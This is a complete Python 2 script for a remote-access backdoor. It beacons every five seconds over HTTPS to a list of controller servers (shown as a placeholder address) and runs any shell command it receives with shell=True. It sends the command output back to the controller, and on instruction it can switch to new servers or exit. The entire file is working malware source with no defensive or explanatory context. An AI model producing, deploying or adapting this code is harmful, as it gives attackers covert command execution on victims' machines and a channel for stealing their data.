#!/usr/bin/env python
import httplib
import random
import string
import subprocess
import time

servers = ['x.x.x.x:x']
iden = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(4))
print iden
output = ''
while True:
    try:
        server, port = random.choice(servers).split(':')
        connection = httplib.HTTPSConnection(server, port)
        connection.request('POST', '/', '{}:{}'.format(iden, output))
        output = ''
        response = connection.getresponse()
        if response.status == 200:
            data = response.read()
            if data:
                command, parameters = data.split(':', 1)
                if command == 'T':
                    exit()
                if command == 'N':
                    servers = parameters.split(',')
                if command == 'C':
                    output = subprocess.Popen(parameters, shell=True, stdout=subprocess.PIPE).stdout.read()
        connection.close()
    except Exception, e:
        print e
    time.sleep(5)